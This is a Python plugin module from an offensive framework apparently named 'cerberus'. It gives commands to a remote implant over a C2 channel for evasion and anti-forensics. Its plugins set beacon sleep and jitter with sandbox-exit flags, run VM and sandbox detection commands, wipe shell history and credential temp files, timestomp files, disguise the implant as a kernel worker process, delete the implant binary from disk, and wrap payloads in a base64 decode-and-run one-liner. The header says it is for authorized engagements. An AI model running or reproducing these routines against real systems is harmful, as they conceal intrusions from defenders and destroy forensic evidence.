"""Evasion techniques — OPSEC profiles, timing, traffic camouflage, implant controls.

These are operator helpers for authorized engagements. They adjust noise, timing,
and implant behavior; they do not claim to be undetectable.
"""

from __future__ import annotations

import asyncio
import base64
import random
import shutil
from typing import Any

from cerberus.core.c2 import get_c2
from cerberus.core.opsec import STEALTH_PROFILES, human_delay, profile, random_ua
from cerberus.core.phase import Phase
from cerberus.core.plugin_api import OpsecLevel, Plugin, PluginMeta, register_plugin

ALL_PHASES = list(Phase)


def _beacon_id(kwargs: dict, server) -> str | None:
    return kwargs.get("beacon") or kwargs.get("id") or (server.active_id if server else None)


@register_plugin
class EvasionProfilePlugin(Plugin):
    meta = PluginMeta(
        name="evasion_profile",
        description="Show or set stealth profile (noisy|balanced|ninja) and print OPSEC effects",
        phase=ALL_PHASES,
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        from cerberus.core.config import save_config

        name = kwargs.get("profile") or kwargs.get("cmd") or kwargs.get("stealth")
        if name:
            if name not in STEALTH_PROFILES:
                return {"success": False, "message": f"unknown profile: {name} (noisy|balanced|ninja)"}
            self.config.stealth = name
            save_config(self.config)
        p = profile(self.config.stealth)
        return {
            "success": True,
            "message": f"stealth={self.config.stealth}",
            "profile": self.config.stealth,
            "settings": p,
            "notes": [
                "ninja: slower scans, fewer threads, blocks dangerous plugins by policy",
                "balanced: default for most ops",
                "noisy: fast and loud — labs only",
            ],
        }


@register_plugin
class EvasionDelayPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_delay",
        description="Sleep with human-like jitter (ms= or seconds=); respects stealth profile",
        phase=ALL_PHASES,
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        if kwargs.get("seconds") is not None:
            ms = int(float(kwargs["seconds"]) * 1000)
        elif kwargs.get("ms") is not None:
            ms = int(kwargs["ms"])
        else:
            ms = profile(self.config.stealth)["delay_ms"] * 10
        await human_delay(self.config.stealth, base_ms=ms)
        return {"success": True, "message": f"delayed ~{ms}ms (jittered)"}


@register_plugin
class EvasionJitterBeaconPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_jitter",
        description="Set beacon sleep + high jitter on implant (seconds=)",
        phase=[Phase.EXPLOIT, Phase.PRIVESC, Phase.LATERAL, Phase.EXFIL],
        opsec=OpsecLevel.LOW,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        # Map stealth → recommended sleep
        defaults = {"ninja": 60, "balanced": 15, "noisy": 5}
        secs = int(kwargs.get("seconds") or defaults.get(self.config.stealth, 15))
        ok = await server.task(bid, "sleep", {"seconds": secs})
        # also send evade config if implant supports it
        await server.task(bid, "evade", {"jitter": True, "sandbox_exit": True})
        return {"success": ok, "message": f"beacon {bid} sleep={secs}s + evade flags", "beacon": bid}


@register_plugin
class EvasionSandboxCheckPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_sandbox_check",
        description="Run sandbox/VM heuristics on beacon (uptime, cores, MAC, known tools)",
        phase=[Phase.EXPLOIT, Phase.PRIVESC, Phase.LATERAL],
        opsec=OpsecLevel.LOW,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        # Linux-oriented heuristic script
        remote = r"""
echo '===UPTIME==='; uptime
echo '===CORES==='; nproc 2>/dev/null; echo '===MEM==='; free -m 2>/dev/null | head -2
echo '===DMI==='; cat /sys/class/dmi/id/product_name 2>/dev/null; cat /sys/class/dmi/id/sys_vendor 2>/dev/null
echo '===MAC==='; ip link 2>/dev/null | grep -o 'link/ether [^ ]*' | head -3
echo '===DOCKER==='; test -f /.dockerenv && echo docker || echo no-docker
echo '===VMTOOLS==='; ls /usr/bin/*vmtools* /usr/bin/*vbox* 2>/dev/null | head
echo '===PROCS==='; ps aux 2>/dev/null | grep -iE 'wireshark|tcpdump|vbox|vmware|sandbox|analyz' | grep -v grep | head
"""
        ok = await server.task(bid, "shell", {"cmd": remote})
        return {"success": ok, "message": f"sandbox_check → {bid} (see c2_results)", "beacon": bid}


@register_plugin
class EvasionClearLogsPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_clear_logs",
        description="Best-effort clear of current user shell history / tmp markers on beacon",
        phase=[Phase.EXFIL, Phase.REPORT],
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        # Conservative: history files + known cerberus tmp markers only
        remote = (
            "cat /dev/null > ~/.bash_history 2>/dev/null; "
            "cat /dev/null > ~/.zsh_history 2>/dev/null; "
            "history -c 2>/dev/null; "
            "rm -f /tmp/.cerberus_creds* /tmp/.cerberus_creds.tgz 2>/dev/null; "
            "echo cleared"
        )
        ok = await server.task(bid, "shell", {"cmd": remote})
        return {"success": ok, "message": f"history/tmp cleanup tasked → {bid}", "beacon": bid}


@register_plugin
class EvasionTimestompPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_timestomp",
        description="Copy timestamps from reference file onto target file on beacon (ref= target=)",
        phase=[Phase.PRIVESC, Phase.LATERAL, Phase.EXFIL],
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        ref = kwargs.get("ref") or kwargs.get("reference") or "/etc/passwd"
        target = kwargs.get("path") or kwargs.get("target_file") or kwargs.get("remote")
        if not target:
            return {"success": False, "message": "need path= file to timestomp"}
        remote = f"touch -r '{ref}' '{target}' 2>&1 && stat '{target}' | head -5"
        ok = await server.task(bid, "shell", {"cmd": remote})
        return {"success": ok, "message": f"timestomp {target} ← {ref} → {bid}", "beacon": bid}


@register_plugin
class EvasionEncodePlugin(Plugin):
    meta = PluginMeta(
        name="evasion_encode",
        description="Encode a payload as base64 / hex / xor-key for staging (payload= or cmd=)",
        phase=ALL_PHASES,
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        payload = kwargs.get("payload") or kwargs.get("cmd") or ""
        if not payload:
            return {"success": False, "message": "need payload="}
        raw = payload.encode()
        b64 = base64.b64encode(raw).decode()
        hexed = raw.hex()
        key = random.randint(1, 255)
        xored = bytes(b ^ key for b in raw).hex()
        # one-liner decoders for linux
        b64_run = f"echo {b64} | base64 -d | sh"
        return {
            "success": True,
            "message": "encoded",
            "base64": b64,
            "hex": hexed,
            "xor_key": key,
            "xor_hex": xored,
            "b64_one_liner": b64_run,
        }


@register_plugin
class EvasionProxyChainPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_proxy",
        description="Show/set proxy env guidance for tools (http_proxy) — stores in config notes",
        phase=ALL_PHASES,
        opsec=OpsecLevel.LOW,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        proxy = kwargs.get("proxy") or kwargs.get("cmd")
        if proxy:
            # store as custom attribute if config allows — use evidence
            self.evidence.add(
                kind="opsec",
                target="proxy",
                data={"proxy": proxy},
                source="evasion_proxy",
                plugin="evasion_proxy",
                confidence=1.0,
                tags=["opsec"],
            )
        return {
            "success": True,
            "message": f"proxy={'set' if proxy else 'guidance only'}",
            "export": {
                "http_proxy": proxy or "http://127.0.0.1:8080",
                "https_proxy": proxy or "http://127.0.0.1:8080",
                "ALL_PROXY": proxy or "socks5://127.0.0.1:1080",
            },
            "hint": "export http_proxy=... before nmap/curl; implant SOCKS is future work",
        }


@register_plugin
class EvasionProcessMasqPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_masq",
        description="Rename implant process argv on beacon (name= e.g. '[kworker/0:1]')",
        phase=[Phase.EXPLOIT, Phase.PRIVESC, Phase.LATERAL],
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        name = kwargs.get("name") or kwargs.get("cmd") or "[kworker/0:1]"
        ok = await server.task(bid, "masq", {"name": name})
        return {"success": ok, "message": f"masq → {name} on {bid}", "beacon": bid}


@register_plugin
class EvasionSelfDeletePlugin(Plugin):
    meta = PluginMeta(
        name="evasion_self_delete",
        description="Ask implant to unlink its binary from disk (keeps running in memory)",
        phase=[Phase.EXPLOIT, Phase.PRIVESC, Phase.LATERAL, Phase.EXFIL],
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        ok = await server.task(bid, "selfdelete", {})
        return {"success": ok, "message": f"selfdelete tasked → {bid}", "beacon": bid}


@register_plugin
class EvasionOpsecReportPlugin(Plugin):
    meta = PluginMeta(
        name="evasion_opsec_report",
        description="OPSEC checklist for current phase, stealth, and noisy evidence",
        phase=ALL_PHASES,
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        p = profile(self.config.stealth)
        noisy = self.evidence.find(kind="port")  # just a sample
        checklist = [
            f"stealth profile: {self.config.stealth}",
            f"nmap timing: {p['nmap_timing']}, threads: {p['threads']}",
            "prefer AES-GCM C2 (c2_key set)",
            "prefer high beacon sleep on ninja (evasion_jitter)",
            "clear history before leave (evasion_clear_logs)",
            "timestomp dropped binaries",
            "avoid broadcast shell on large session sets",
            "route OSINT through proxy when needed",
        ]
        c2 = get_c2()
        return {
            "success": True,
            "message": "opsec report",
            "checklist": checklist,
            "c2_encrypted": bool(c2 and c2.key),
            "beacons": len(c2.beacons) if c2 else 0,
            "evidence_ports": len(noisy),
        }
